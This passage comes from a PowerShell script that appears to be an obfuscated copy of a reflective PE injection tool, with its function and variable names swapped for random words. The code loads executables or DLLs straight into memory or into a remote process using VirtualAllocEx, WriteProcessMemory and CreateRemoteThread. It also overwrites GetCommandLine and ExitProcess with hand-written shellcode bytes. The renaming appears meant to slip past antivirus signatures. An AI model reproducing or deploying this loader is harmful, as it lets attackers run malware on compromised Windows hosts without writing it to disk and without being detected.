			$FjMNZoVv99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($QFapNKsF99, [Type]$wmxAHjcd99.IMAGE_SECTION_HEADER)
			[IntPtr]$tnuRJrVc99 = teepee ($PEInfo.PEHandle) ($FjMNZoVv99.VirtualAddress)
			
			[UInt32]$RRpYUTxq99 = penises $FjMNZoVv99.Characteristics
			[UInt32]$qnozzWJI99 = $FjMNZoVv99.VirtualSize
			
			[UInt32]$iAEZplXc99 = 0
			deprecate -ItYCAMtj99 "chlorides::VirtualProtect" -PEInfo $PEInfo -StartAddress $tnuRJrVc99 -Size $qnozzWJI99 | Out-Null
			$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($tnuRJrVc99, $qnozzWJI99, $RRpYUTxq99, [Ref]$iAEZplXc99)
			if ($JjRBItJb99 -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	Function Cologne
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$lJWPyeUE99,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$QospSPdE99
		)
		
		$CGLOXTlB99 = @() 
		
		$THQIlluH99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$iAEZplXc99 = 0
		
		[IntPtr]$BSPaOBoi99 = $GMTlJquq99.GetModuleHandle.Invoke("Kernel32.dll")
		if ($BSPaOBoi99 -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$aajsDmQO99 = $GMTlJquq99.GetModuleHandle.Invoke("KernelBase.dll")
		if ($aajsDmQO99 -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$xFXjKgAY99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($lJWPyeUE99)
		$Jwnamqeo99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($lJWPyeUE99)
	
		[IntPtr]$noxCTUai99 = $GMTlJquq99.GetProcAddress.Invoke($aajsDmQO99, "GetCommandLineA")
		[IntPtr]$pDrglUsR99 = $GMTlJquq99.GetProcAddress.Invoke($aajsDmQO99, "GetCommandLineW")
		if ($noxCTUai99 -eq [IntPtr]::Zero -or $pDrglUsR99 -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $noxCTUai99. GetCommandLineW: $pDrglUsR99"
		}
		[Byte[]]$XqRfGRCb99 = @()
		if ($THQIlluH99 -eq 8)
		{
			$XqRfGRCb99 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$XqRfGRCb99 += 0xb8
		
		[Byte[]]$ugbKqPRL99 = @(0xc3)
		$BqIxKlXF99 = $XqRfGRCb99.Length + $THQIlluH99 + $ugbKqPRL99.Length
		
		
		$JbPQEyaO99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BqIxKlXF99)
		$YiHSmknq99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BqIxKlXF99)
		$GMTlJquq99.memcpy.Invoke($JbPQEyaO99, $noxCTUai99, [UInt64]$BqIxKlXF99) | Out-Null
		$GMTlJquq99.memcpy.Invoke($YiHSmknq99, $pDrglUsR99, [UInt64]$BqIxKlXF99) | Out-Null
		$CGLOXTlB99 += ,($noxCTUai99, $JbPQEyaO99, $BqIxKlXF99)
		$CGLOXTlB99 += ,($pDrglUsR99, $YiHSmknq99, $BqIxKlXF99)
		[UInt32]$iAEZplXc99 = 0
		$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($noxCTUai99, [UInt32]$BqIxKlXF99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$iAEZplXc99)
		if ($JjRBItJb99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$mMwZbPpo99 = $noxCTUai99
		personalize -Bytes $XqRfGRCb99 -iHYgyLYx99 $mMwZbPpo99
		$mMwZbPpo99 = teepee $mMwZbPpo99 ($XqRfGRCb99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($Jwnamqeo99, $mMwZbPpo99, $false)
		$mMwZbPpo99 = teepee $mMwZbPpo99 $THQIlluH99
		personalize -Bytes $ugbKqPRL99 -iHYgyLYx99 $mMwZbPpo99
		
		$GMTlJquq99.VirtualProtect.Invoke($noxCTUai99, [UInt32]$BqIxKlXF99, [UInt32]$iAEZplXc99, [Ref]$iAEZplXc99) | Out-Null
		
		
		[UInt32]$iAEZplXc99 = 0
		$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($pDrglUsR99, [UInt32]$BqIxKlXF99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$iAEZplXc99)
		if ($JjRBItJb99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$MnAeIkbw99 = $pDrglUsR99
		personalize -Bytes $XqRfGRCb99 -iHYgyLYx99 $MnAeIkbw99
		$MnAeIkbw99 = teepee $MnAeIkbw99 ($XqRfGRCb99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($xFXjKgAY99, $MnAeIkbw99, $false)
		$MnAeIkbw99 = teepee $MnAeIkbw99 $THQIlluH99
		personalize -Bytes $ugbKqPRL99 -iHYgyLYx99 $MnAeIkbw99
		
		$GMTlJquq99.VirtualProtect.Invoke($pDrglUsR99, [UInt32]$BqIxKlXF99, [UInt32]$iAEZplXc99, [Ref]$iAEZplXc99) | Out-Null
		
		
		$YywYetxx99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $YywYetxx99)
		{
			[IntPtr]$dGOuRaKP99 = $GMTlJquq99.GetModuleHandle.Invoke($Dll)
			if ($dGOuRaKP99 -ne [IntPtr]::Zero)
			{
				[IntPtr]$XaJLenQy99 = $GMTlJquq99.GetProcAddress.Invoke($dGOuRaKP99, "_wcmdln")
				[IntPtr]$zKqnvDqR99 = $GMTlJquq99.GetProcAddress.Invoke($dGOuRaKP99, "_acmdln")
				if ($XaJLenQy99 -eq [IntPtr]::Zero -or $zKqnvDqR99 -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$DuhXMUJA99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($lJWPyeUE99)
				$NUbqwCzh99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($lJWPyeUE99)
				
				$wxTANwdm99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($zKqnvDqR99, [Type][IntPtr])
				$zDssTqXJ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($XaJLenQy99, [Type][IntPtr])
				$dnEhCcsQ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($THQIlluH99)
				$iqwJtwPs99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($THQIlluH99)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($wxTANwdm99, $dnEhCcsQ99, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($zDssTqXJ99, $iqwJtwPs99, $false)
				$CGLOXTlB99 += ,($zKqnvDqR99, $dnEhCcsQ99, $THQIlluH99)
				$CGLOXTlB99 += ,($XaJLenQy99, $iqwJtwPs99, $THQIlluH99)
				
				$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($zKqnvDqR99, [UInt32]$THQIlluH99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$iAEZplXc99)
				if ($JjRBItJb99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DuhXMUJA99, $zKqnvDqR99, $false)
				$GMTlJquq99.VirtualProtect.Invoke($zKqnvDqR99, [UInt32]$THQIlluH99, [UInt32]($iAEZplXc99), [Ref]$iAEZplXc99) | Out-Null
				
				$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($XaJLenQy99, [UInt32]$THQIlluH99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$iAEZplXc99)
				if ($JjRBItJb99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NUbqwCzh99, $XaJLenQy99, $false)
				$GMTlJquq99.VirtualProtect.Invoke($XaJLenQy99, [UInt32]$THQIlluH99, [UInt32]($iAEZplXc99), [Ref]$iAEZplXc99) | Out-Null
			}
		}
		
		
		$CGLOXTlB99 = @()
		$UrXuUQip99 = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		[IntPtr]$YIMTnjkc99 = $GMTlJquq99.GetModuleHandle.Invoke("mscoree.dll")
		if ($YIMTnjkc99 -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$AVSjkjYK99 = $GMTlJquq99.GetProcAddress.Invoke($YIMTnjkc99, "CorExitProcess")
		if ($AVSjkjYK99 -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$UrXuUQip99 += $AVSjkjYK99
		
		[IntPtr]$JFfHnLfk99 = $GMTlJquq99.GetProcAddress.Invoke($BSPaOBoi99, "ExitProcess")
		if ($JFfHnLfk99 -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$UrXuUQip99 += $JFfHnLfk99
		
		[UInt32]$iAEZplXc99 = 0
		foreach ($ezzAbYtd99 in $UrXuUQip99)
		{
			$NhEYRsRG99 = $ezzAbYtd99
			[Byte[]]$XqRfGRCb99 = @(0xbb)
			[Byte[]]$ugbKqPRL99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($THQIlluH99 -eq 8)
			{
				[Byte[]]$XqRfGRCb99 = @(0x48, 0xbb)
				[Byte[]]$ugbKqPRL99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$QcwCJuOP99 = @(0xff, 0xd3)
			$BqIxKlXF99 = $XqRfGRCb99.Length + $THQIlluH99 + $ugbKqPRL99.Length + $THQIlluH99 + $QcwCJuOP99.Length
			
			[IntPtr]$xUALHwCQ99 = $GMTlJquq99.GetProcAddress.Invoke($BSPaOBoi99, "ExitThread")
			if ($xUALHwCQ99 -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($ezzAbYtd99, [UInt32]$BqIxKlXF99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$iAEZplXc99)
			if ($JjRBItJb99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$WNPTlrsv99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BqIxKlXF99)
			$GMTlJquq99.memcpy.Invoke($WNPTlrsv99, $ezzAbYtd99, [UInt64]$BqIxKlXF99) | Out-Null
			$CGLOXTlB99 += ,($ezzAbYtd99, $WNPTlrsv99, $BqIxKlXF99)
			
			personalize -Bytes $XqRfGRCb99 -iHYgyLYx99 $NhEYRsRG99
			$NhEYRsRG99 = teepee $NhEYRsRG99 ($XqRfGRCb99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($QospSPdE99, $NhEYRsRG99, $false)
			$NhEYRsRG99 = teepee $NhEYRsRG99 $THQIlluH99
			personalize -Bytes $ugbKqPRL99 -iHYgyLYx99 $NhEYRsRG99
			$NhEYRsRG99 = teepee $NhEYRsRG99 ($ugbKqPRL99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($xUALHwCQ99, $NhEYRsRG99, $false)
			$NhEYRsRG99 = teepee $NhEYRsRG99 $THQIlluH99
			personalize -Bytes $QcwCJuOP99 -iHYgyLYx99 $NhEYRsRG99
			$GMTlJquq99.VirtualProtect.Invoke($ezzAbYtd99, [UInt32]$BqIxKlXF99, [UInt32]$iAEZplXc99, [Ref]$iAEZplXc99) | Out-Null
		}
		Write-Output $CGLOXTlB99
	}
	
	
	Function cartooned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$cHxVhGZT99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$GMTlJquq99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]$iAEZplXc99 = 0
		foreach ($Info in $cHxVhGZT99)
		{
			$JjRBItJb99 = $GMTlJquq99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$iAEZplXc99)
			if ($JjRBItJb99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$GMTlJquq99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$GMTlJquq99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$iAEZplXc99, [Ref]$iAEZplXc99) | Out-Null
		}
	}
	Function gentled
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$QeodNfcO99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$wmxAHjcd99 = whitewashes
		$Win32Constants = forgathered
		$PEInfo = watching -QeodNfcO99 $QeodNfcO99 -wmxAHjcd99 $wmxAHjcd99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$csgXfluF99 = teepee ($QeodNfcO99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ogsoKfyO99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($csgXfluF99, [Type]$wmxAHjcd99.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ogsoKfyO99.NumberOfNames; $i++)
		{
			$tbMXEOIM99 = teepee ($QeodNfcO99) ($ogsoKfyO99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$BvnOBCyf99 = teepee ($QeodNfcO99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($tbMXEOIM99, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($BvnOBCyf99)
			if ($Name -ceq $FunctionName)
			{
				$mdWGMGvM99 = teepee ($QeodNfcO99) ($ogsoKfyO99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$TPtMMLaz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mdWGMGvM99, [Type][UInt16])
				$fUaTthIH99 = teepee ($QeodNfcO99) ($ogsoKfyO99.AddressOfFunctions + ($TPtMMLaz99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$LvrOVGCu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($fUaTthIH99, [Type][UInt32])
				return teepee ($QeodNfcO99) ($LvrOVGCu99)
			}
		}
		
		return [IntPtr]::Zero
	}
	Function sluicing
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$jfneoYUd99,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$gApRtNwy99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$zookRCtG99
		)
		
		$THQIlluH99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$Win32Constants = forgathered
		$GMTlJquq99 = exposing
		$wmxAHjcd99 = whitewashes
		
		$JPBwNdSD99 = $false
		if (($zookRCtG99 -ne $null) -and ($zookRCtG99 -ne [IntPtr]::Zero))
		{
			$JPBwNdSD99 = $true
		}
		
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = hastier -jfneoYUd99 $jfneoYUd99 -wmxAHjcd99 $wmxAHjcd99
		$lAProRQK99 = $PEInfo.OriginalImageBase
		$EClFvyWq99 = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$EClFvyWq99 = $false
		}
		
		
		$ZCTjgQQa99 = $true
		if ($JPBwNdSD99 -eq $true)
		{
			$BSPaOBoi99 = $GMTlJquq99.GetModuleHandle.Invoke("kernel32.dll")
			$tjxmMPpq99 = $GMTlJquq99.GetProcAddress.Invoke($BSPaOBoi99, "IsWow64Process")
			if ($tjxmMPpq99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$VczUmUep99 = $false
			$JjRBItJb99 = $GMTlJquq99.IsWow64Process.Invoke($zookRCtG99, [Ref]$VczUmUep99)
			if ($JjRBItJb99 -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($VczUmUep99 -eq $true) -or (($VczUmUep99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$ZCTjgQQa99 = $false
			}
			
			$eSZnJKaO99 = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$eSZnJKaO99 = $false
			}
			if ($eSZnJKaO99 -ne $ZCTjgQQa99)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$ZCTjgQQa99 = $false
			}
		}
		if ($ZCTjgQQa99 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$dqAucJvW99 = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$dqAucJvW99 = $lAProRQK99
		}
		$QeodNfcO99 = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$RUjdMGVV99 = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $QeodNfcO99. If it is loaded in a remote process, this is the address in the remote process.
		if ($JPBwNdSD99 -eq $true)
		{
			$QeodNfcO99 = $GMTlJquq99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			$RUjdMGVV99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, $dqAucJvW99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RUjdMGVV99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($EClFvyWq99 -eq $true)
			{
				$QeodNfcO99 = $GMTlJquq99.VirtualAlloc.Invoke($dqAucJvW99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$QeodNfcO99 = $GMTlJquq99.VirtualAlloc.Invoke($dqAucJvW99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$RUjdMGVV99 = $QeodNfcO99
		}
		
		[IntPtr]$CvjzoSts99 = teepee ($QeodNfcO99) ([Int64]$PEInfo.SizeOfImage)
		if ($QeodNfcO99 -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($jfneoYUd99, 0, $QeodNfcO99, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = watching -QeodNfcO99 $QeodNfcO99 -wmxAHjcd99 $wmxAHjcd99 -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $CvjzoSts99
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $RUjdMGVV99
		Write-Verbose "StartAddress: $QeodNfcO99    EndAddress: $CvjzoSts99"
		
		
		Write-Verbose "Copy PE sections in to memory"
		deforms -jfneoYUd99 $jfneoYUd99 -PEInfo $PEInfo -GMTlJquq99 $GMTlJquq99 -wmxAHjcd99 $wmxAHjcd99
		
		
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		windlass -PEInfo $PEInfo -lAProRQK99 $lAProRQK99 -Win32Constants $Win32Constants -wmxAHjcd99 $wmxAHjcd99
		
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($JPBwNdSD99 -eq $true)
		{
			darkly -PEInfo $PEInfo -GMTlJquq99 $GMTlJquq99 -wmxAHjcd99 $wmxAHjcd99 -Win32Constants $Win32Constants -zookRCtG99 $zookRCtG99
		}
		else
		{
			darkly -PEInfo $PEInfo -GMTlJquq99 $GMTlJquq99 -wmxAHjcd99 $wmxAHjcd99 -Win32Constants $Win32Constants
		}
		
		
		if ($JPBwNdSD99 -eq $false)
		{
			if ($EClFvyWq99 -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				chlorides -PEInfo $PEInfo -GMTlJquq99 $GMTlJquq99 -Win32Constants $Win32Constants -wmxAHjcd99 $wmxAHjcd99
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		if ($JPBwNdSD99 -eq $true)
		{
			[UInt32]$nnjDLRCX99 = 0
			$JjRBItJb99 = $GMTlJquq99.WriteProcessMemory.Invoke($zookRCtG99, $RUjdMGVV99, $QeodNfcO99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$nnjDLRCX99)
			if ($JjRBItJb99 -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($JPBwNdSD99 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$etWdKgCw99 = teepee ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$ZDErcYZL99 = rafters @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$VTxCalzZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($etWdKgCw99, $ZDErcYZL99)
				
				$VTxCalzZ99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$etWdKgCw99 = teepee ($RUjdMGVV99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					$YtzbtJcU99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$sgALejig99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$eeYpOQnu99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$YtzbtJcU99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$sgALejig99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$eeYpOQnu99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$TcehdClB99 = $YtzbtJcU99.Length + $sgALejig99.Length + $eeYpOQnu99.Length + ($THQIlluH99 * 2)
				$aOFXnsxo99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TcehdClB99)
				$ASDxFcyi99 = $aOFXnsxo99
				
				personalize -Bytes $YtzbtJcU99 -iHYgyLYx99 $aOFXnsxo99
				$aOFXnsxo99 = teepee $aOFXnsxo99 ($YtzbtJcU99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($RUjdMGVV99, $aOFXnsxo99, $false)
				$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
				personalize -Bytes $sgALejig99 -iHYgyLYx99 $aOFXnsxo99
				$aOFXnsxo99 = teepee $aOFXnsxo99 ($sgALejig99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($etWdKgCw99, $aOFXnsxo99, $false)
				$aOFXnsxo99 = teepee $aOFXnsxo99 ($THQIlluH99)
				personalize -Bytes $eeYpOQnu99 -iHYgyLYx99 $aOFXnsxo99
				$aOFXnsxo99 = teepee $aOFXnsxo99 ($eeYpOQnu99.Length)
				
				$KodyTjfM99 = $GMTlJquq99.VirtualAllocEx.Invoke($zookRCtG99, [IntPtr]::Zero, [UIntPtr][UInt64]$TcehdClB99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($KodyTjfM99 -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$JjRBItJb99 = $GMTlJquq99.WriteProcessMemory.Invoke($zookRCtG99, $KodyTjfM99, $ASDxFcyi99, [UIntPtr][UInt64]$TcehdClB99, [Ref]$nnjDLRCX99)
				if (($JjRBItJb99 -eq $false) -or ([UInt64]$nnjDLRCX99 -ne [UInt64]$TcehdClB99))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$rUcofqbc99 = Gainsborough -AWGiTHqY99 $zookRCtG99 -StartAddress $KodyTjfM99 -GMTlJquq99$GMTlJquq99#-
				$tjxmMPpq99 = $GMTlJquq99.WaitForSingleObject.Invoke($rUcofqbc99, 20000)
				if ($tjxmMPpq99 -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$GMTlJquq99.VirtualFreeEx.Invoke($zookRCtG99, $KodyTjfM99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$QospSPdE99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($QospSPdE99, 0, 0x00)
			$qlUHjJIw99 = Cologne -PEInfo $PEInfo -GMTlJquq99 $GMTlJquq99 -Win32Constants $Win32Constants -lJWPyeUE99 $gApRtNwy99 -QospSPdE99 $QospSPdE99
			[IntPtr]$ZubapDKN99 = teepee ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ZubapDKN99. Creating thread for the EXE to run in."
			$GMTlJquq99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ZubapDKN99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$UyGWBYaX99 = [System.Runtime.InteropServices.Marshal]::ReadByte($QospSPdE99, 0)
				if ($UyGWBYaX99 -eq 1)
				{
					cartooned -cHxVhGZT99 $qlUHjJIw99 -GMTlJquq99 $GMTlJquq99 -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $RUjdMGVV99)
	}
	
	
	Function backslidden
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$QeodNfcO99
		)
		
		$Win32Constants = forgathered
		$GMTlJquq99 = exposing
		$wmxAHjcd99 = whitewashes
		
		$PEInfo = watching -QeodNfcO99 $QeodNfcO99 -wmxAHjcd99 $wmxAHjcd99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$dWDvlOYQ99 = teepee ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$OOKmGSWV99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($dWDvlOYQ99, [Type]$wmxAHjcd99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($OOKmGSWV99.Characteristics -eq 0 `
						-and $OOKmGSWV99.FirstThunk -eq 0 `
